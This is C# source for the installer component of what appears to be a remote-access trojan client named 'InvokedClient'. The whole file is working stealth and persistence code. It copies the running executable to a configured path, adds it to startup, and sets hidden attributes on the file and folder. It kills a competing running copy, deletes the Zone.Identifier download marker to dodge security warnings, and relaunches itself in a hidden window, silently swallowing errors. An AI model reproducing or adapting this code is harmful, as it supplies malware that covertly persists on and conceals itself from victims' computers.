

using InvokedClient.Config;
using InvokedClient.Extensions;
using InvokedCommon.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace InvokedClient.Setup
{
	public class ClientInstaller : ClientSetupBase
	{
		public void ApplySettings()
		{
			if (Settings.STARTUP)
				new ClientStartup().AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
			if (Settings.INSTALL)
			{
				if (Settings.HIDEFILE)
				{
					try
					{
						File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
					}
					catch (Exception ex)
					{
					}
				}
			}
			if (!Settings.INSTALL || !Settings.HIDEINSTALLSUBDIRECTORY)
				return;
			if (string.IsNullOrEmpty(Settings.SUBDIRECTORY))
				return;
			try
			{
				new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH)).Attributes |= FileAttributes.Hidden;
			}
			catch (Exception ex)
			{
			}
		}

		public void Install()
		{
			if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
				Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
			if (File.Exists(Settings.INSTALLPATH))
			{
				try
				{
					File.Delete(Settings.INSTALLPATH);
				}
				catch (Exception ex)
				{
					switch (ex)
					{
						case IOException _:
						case UnauthorizedAccessException _:
							Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
							int id = Process.GetCurrentProcess().Id;
							foreach (Process proc in processesByName)
							{
								if (proc.Id != id && !(proc.GetMainModuleFileName() != Settings.INSTALLPATH))
								{
									proc.Kill();
									Thread.Sleep(2000);
									break;
								}
							}
							break;
					}
				}
			}
			File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
			this.ApplySettings();
			FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
			Process.Start(new ProcessStartInfo()
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				FileName = Settings.INSTALLPATH
			});
		}
	}
}